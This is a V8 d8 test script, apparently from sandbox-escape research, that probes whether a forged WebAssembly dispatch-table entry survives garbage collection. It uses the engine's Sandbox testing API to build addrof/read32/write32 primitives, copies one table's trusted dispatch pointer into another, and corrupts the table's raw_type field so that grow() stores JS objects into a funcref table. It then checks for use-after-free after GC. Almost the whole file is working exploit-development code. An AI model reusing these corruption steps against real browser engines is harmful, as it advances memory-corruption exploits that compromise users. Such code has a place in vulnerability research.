// C21 H24: liveness of hidden dispatch injection from H23.
//
// After grow copies donor dispatch entry into victim while JS entries contain
// marker objects, drop ordinary refs to donor table/target functions/instance
// and force GC. If call still works and WeakRefs stay alive, hidden dispatch
// state is a root, not immediate UAF.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kWeakHeapObjectTag = 3;
const kHeapObjectTag = 1;
const kTrustedDispatchTableOffset = 0x1c;
const kWasmTableObjectType =
    Sandbox.getInstanceTypeIdFor('WASM_TABLE_OBJECT_TYPE');
const kRawTypeOffset = Sandbox.getFieldOffset(kWasmTableObjectType, 'raw_type');
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrof(obj) {
  return Sandbox.getAddressOf(obj) & ~kWeakHeapObjectTag;
}

function tagged(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function read32(addr) {
  return memory.getUint32(addr, true);
}

function write32(addr, val) {
  memory.setUint32(addr, val, true);
}

function rawTypeField(table) {
  return memory.getUint32(tagged(table) + kRawTypeOffset - kHeapObjectTag, true);
}

function corruptRawType(table, rawTypeSmi) {
  Sandbox.corruptObjectField(table, 'raw_type', rawTypeSmi);
}

function makeTargetInstance() {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  b.addFunction('f0', sig)
      .addBody([kExprLocalGet, 0, kExprI32Const, 0x10, kExprI32Add])
      .exportFunc();
  b.addFunction('f1', sig)
      .addBody([kExprLocalGet, 0, kExprI32Const, 0x20, kExprI32Add])
      .exportFunc();
  return b.instantiate();
}

function makeCaller(table) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  let t = b.addImportedTable('imp', 'table', 1, 3, kWasmFuncRef);
  b.addFunction('call', kSig_i_ii)
      .addBody([
        kExprLocalGet, 1,
        kExprLocalGet, 0,
        kExprCallIndirect, sig, t,
      ])
      .exportFunc();
  return b.instantiate({imp: {table}}).exports.call;
}

let externTable = new WebAssembly.Table({element: 'externref', initial: 1});
let externRefRawTypeSmi = rawTypeField(externTable);
let targetInstance = makeTargetInstance();
let f0 = targetInstance.exports.f0;
let f1 = targetInstance.exports.f1;
let weakInstance = new WeakRef(targetInstance);
let weakF1 = new WeakRef(f1);

let donor = new WebAssembly.Table({element: 'anyfunc', initial: 2, maximum: 2});
donor.set(0, f0);
donor.set(1, f1);

let victim = new WebAssembly.Table({element: 'anyfunc', initial: 1, maximum: 3});
victim.set(0, f0);
let funcrefRawTypeSmi = rawTypeField(victim);

write32(addrof(victim) + kTrustedDispatchTableOffset,
        read32(addrof(donor) + kTrustedDispatchTableOffset));
corruptRawType(victim, externRefRawTypeSmi);
let marker = {kind: 'grow-init'};
victim.grow(2, marker);
let entry1IsMarkerBeforeRestore = victim.get(1) === marker;
corruptRawType(victim, funcrefRawTypeSmi);

let call = makeCaller(victim);
print(`before_drop=${call(1, 7)}`);
print(`entry1_was_marker=${entry1IsMarkerBeforeRestore}`);

donor = null;
targetInstance = null;
f1 = null;

for (let r = 0; r < 8; r++) {
  gc();
  let junk = [];
  for (let i = 0; i < 20000; i++) junk.push({i, pad: i + 1});
}
gc();

print(`weak_instance_alive=${weakInstance.deref() !== undefined}`);
print(`weak_f1_alive=${weakF1.deref() !== undefined}`);

try {
  print(`after_gc=${call(1, 7)}`);
} catch (e) {
  print(`after_gc_throw=${e.name}:${e.message}`);
}
